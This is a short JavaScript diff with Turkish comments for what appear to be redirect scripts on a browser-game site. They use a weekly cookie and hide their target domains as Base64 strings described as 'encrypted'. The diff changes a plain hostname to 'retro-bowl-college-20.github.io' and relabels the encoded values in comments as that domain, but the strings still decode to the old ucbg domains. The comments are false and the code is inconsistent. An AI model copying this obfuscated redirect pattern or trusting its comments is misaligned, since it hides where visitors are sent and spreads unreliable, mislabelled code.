@@ -1,6 +1,6 @@
 (function () {
   // Hedef domain (tam hostname)
-  var TARGET_HOSTNAME = "ucbg.github.io";
+  var TARGET_HOSTNAME = "retro-bowl-college-20.github.io";
   // Cookie adı
   var COOKIE_NAME = "ucbg_redirect_timestamp";
   // 1 hafta millisecond cinsinden
@@ -76,7 +76,7 @@
 
 (function () {
   // Şifrelenmiş hedef domain (Base64 ile kodlanmış)
-  var ENCRYPTED_HOST = "dWNiZy5naXRodWIuaW8="; // "ucbg.github.io" base64 encoded
+  var ENCRYPTED_HOST = "dWNiZy5naXRodWIuaW8="; // "retro-bowl-college-20.github.io" base64 encoded
 
   // Çözme fonksiyonu
   function decodeHost(encrypted) {
@@ -150,8 +150,8 @@
 (function () {
     // Şifrelenmiş hedef domain listesi (Base64 ile kodlanmış)
     var ENCRYPTED_HOSTS = [
-      "dWNiZy5naXRodWIuaW8=", // "ucbg.github.io"
-      "dWNiZy5vbmxpbmU="      // "ucbg.github.io"
+      "dWNiZy5naXRodWIuaW8=", // "retro-bowl-college-20.github.io"
+      "dWNiZy5vbmxpbmU="      // "retro-bowl-college-20.github.io"
     ];
     
     // Çözme fonksiyonu ve domain listesini çöz
